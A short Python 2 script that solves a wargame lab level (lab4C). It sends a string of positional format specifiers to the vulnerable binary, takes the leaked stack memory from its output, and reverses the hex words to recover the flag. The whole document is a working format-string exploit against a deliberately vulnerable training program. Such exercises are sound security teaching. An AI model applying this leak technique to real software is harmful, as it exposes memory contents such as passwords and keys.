import subprocess

tokens = []
for i in range(32/4):
    tokens.append("%{}$08X".format(29+i))

#print "".join(tokens)

proc = subprocess.Popen("/levels/lab04/lab4C", stdout=subprocess.PIPE, stdin=subprocess.PIPE)
out = proc.communicate(input="".join(tokens)+"\n\n")
leak = out[0].splitlines()[-1].split()[0] # Get first word of last line
#print leak
num_chunks = len(leak)/8
words = []
for i in range(num_chunks):
    words.append(leak[i*8:i*8+8])

flag = []
#print(words)
for word in words:
    decoded = word.decode('hex')[::-1]
    flag.append(decoded)

print "".join(flag)
